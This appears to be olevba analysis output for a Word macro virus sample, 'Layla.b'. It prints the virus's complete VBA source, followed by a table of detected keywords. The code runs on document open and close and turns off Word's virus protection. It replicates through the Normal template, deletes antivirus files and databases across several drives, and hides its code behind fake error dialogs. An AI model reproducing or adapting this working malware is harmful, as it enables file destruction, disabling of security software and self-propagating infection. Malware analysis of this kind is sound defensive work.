olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Layla.b-4810ea45548baaa2ee5e3cfe0d4e3554df29e6d9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Layla.b-4810ea45548baaa2ee5e3cfe0d4e3554df29e6d9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MaCROSOFT.bas 
in file: Virus.MSWord.Layla.b-4810ea45548baaa2ee5e3cfe0d4e3554df29e6d9 - OLE stream: 'Macros/VBA/MaCROSOFT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
 Call GlobalMission
On Error Resume Next
 Call MaCROSOFT
End Sub
Sub MaCROSOFT()
'Tj's Lab. presents... Hi from Samara !
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
On Error Resume Next
With Options
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

On Error Resume Next
With Application
     .UserName = "Patient Of Dr.OGen"
     .UserInitials = ""
     .UserAddress = ""
End With
ActiveDocument.ReadOnlyRecommended = False
KTO_ = 0
If MacroContainer = NormalTemplate Then KTO_ = 1
If KTO_ = 1 Then KTO = NormalTemplate.FullName Else KTO = ActiveDocument.FullName
If KTO_ = 1 Then KOGO = ActiveDocument.FullName Else KOGO = NormalTemplate.FullName
Application.OrganizerCopy Source:=KTO, Destination:=KOGO, Name:="MaCROSOFT", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=KTO, Destination:=KOGO, Name:="AboutFrm", Object:=wdOrganizerObjectProjectItems
If KTO_ = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If KTO_ = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
End Sub
Sub AutoExec()
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
On Error Resume Next
If Day(Now()) = 29 Or Day(Now()) = 3 _
Then Application.Caption = "Macrosoft Word" _
Else Application.Caption = ""
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
On Error Resume Next
With Application
     .UserName = "Patient Of Dr.OGen"
     .UserInitials = ""
     .UserAddress = ""
End With
End Sub
Sub AutoExit()
On Error Resume Next
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
           Name:="TJ", Object:=wdOrganizerObjectProjectItems
If NormalTemplate.Saved = False Then NormalTemplate.Save
Dim i
Application.Visible = False
Path = "c:\"
Search:
DirName = Dir(Path, vbDirectory)
Do While DirName <> ""
    If DirName <> "." And DirName <> ".." Then
        If (GetAttr(Path & DirName) And vbDirectory) = vbDirectory _
        Then
          With Application.FileSearch
               .FileName = "*d*r*w*.*d*b*"
               .LookIn = Path & DirName
               .Execute
          For i = 1 To .FoundFiles.Count
           On Error Resume Next
           Kill Path & DirName & "\*.*"
           Next i
          End With
          With Application.FileSearch
               .FileName = "*a*v*p*.*"
               .LookIn = Path & DirName
               .Execute
          For i = 1 To .FoundFiles.Count
           On Error Resume Next
           Kill Path & DirName & "\*.av*"
           On Error Resume Next
           Kill Path & DirName & "\*.key"
           Next i
          End With
        End If
    End If
    DirName = Dir
Loop

Select Case Path
Case "c:\"
    Path = "c:\program files\"
    GoTo Search
Case "c:\program files\"
    Path = "d:\"
    GoTo Search
Case "d:\"
    Path = "e:\"
    GoTo Search
Case "e:\"
    GoTo Konets
End Select

Konets:
End Sub
Sub AutoClose()
On Error Resume Next
 Call FileClose
End Sub
Sub FileClose()
If (Format(Now, "dd") = 29) And (Format(Now, "ss") = 29) Then GoTo Nehorosho Else GoTo Profilaktika
Nehorosho:
    Selection.WholeStory
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdBlack
    Selection.TypeText Text:="Âû ÿâëÿåòåñü íåçàðåãèñòðèðîâàííûì ïîëüçîâàòåëåì ïðîäóêòà"
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdRed
    Selection.TypeText Text:="Dr.OGen v.1.1"
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdBlack
    Selection.TypeText Text:="Âû ìîæåòå âûñëàòü çàïðîñ íà ðåãèñòðàöèþ â ïðîèçâîëüíîé ôîðìå ïî EMail:"
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdBlue
    Selection.TypeText Text:="ogen@mail.ru"
    Selection.MoveLeft Unit:=wdCharacter, Count:=12, Extend:=wdExtend
    ActiveDocument.Hyperlinks.Add Anchor:=Selection.Range, Address:= _
        "mailto:ogen@mail.ru", SubAddress:=""
    Selection.Font.ColorIndex = wdBlack
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Òàêæå ïðèíèìàþòñÿ îòçûâû è ïðåäëîæåíèÿ ïî ðàáîòå ïðîãðàììû."
    Selection.WholeStory
    Selection.LanguageID = wdNoProofing
    Selection.Font.Name = "Arial"
    Selection.Font.Size = 12
    Selection.MoveRight Unit:=wdCharacter, Count:=1
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdBlack
Profilaktika:
 On Error Resume Next
 Call MaCROSOFT
 ActiveDocument.Close
End Sub
Sub FileOpen()
Dialogs(wdDialogFileOpen).Show
On Error Resume Next
 Call GlobalMission
On Error Resume Next
 Call MaCROSOFT
Application.DisplayAlerts = wdAlertsNone
Application.ScreenUpdating = False
ActiveDocument.Save
End Sub
Sub ToolsMacro()
    Dim MB
    On Error Resume Next
    MB = MsgBox("Can't find necessary library VBOGen.DLL", 16, "Microsoft Word Error")
End Sub
Sub ToolsCustomize()
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
    Dim MB
    On Error Resume Next
    MB = MsgBox("The program has executed invalid operation and will be closed", 16, "FATAL ERROR")
    Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub
Sub HelpAbout()
    On Error Resume Next
    AboutFrm.Show
End Sub
Sub GlobalMission()
Dim Location
Location = 0
If MacroContainer = NormalTemplate Then Location = 1
If Location = 1 Then PATIENT = ActiveDocument.FullName Else PATIENT = NormalTemplate.FullName

On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="TJ", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="NewMacros", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="AutoClose", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="AutoExit", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="FileOpen", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="FileClose", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="FileSave", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="ToolsMacro", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="ToolsCustomize", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="FileTemplates", Object:=wdOrganizerObjectProjectItems
On Error Resume Next
Application.OrganizerDelete Source:=PATIENT, _
           Name:="ViewVBCode", Object:=wdOrganizerObjectProjectItems
End Sub
-------------------------------------------------------------------------------
VBA MACRO AboutFrm.frm 
in file: Virus.MSWord.Layla.b-4810ea45548baaa2ee5e3cfe0d4e3554df29e6d9 - OLE stream: 'Macros/VBA/AboutFrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Layla.b-4810ea45548baaa2ee5e3cfe0d4e3554df29e6d9' - OLE stream: 'Macros/AboutFrm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Layla.b-4810ea45548baaa2ee5e3cfe0d4e3554df29e6d9' - OLE stream: 'Macros/AboutFrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |VBOGen.DLL          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

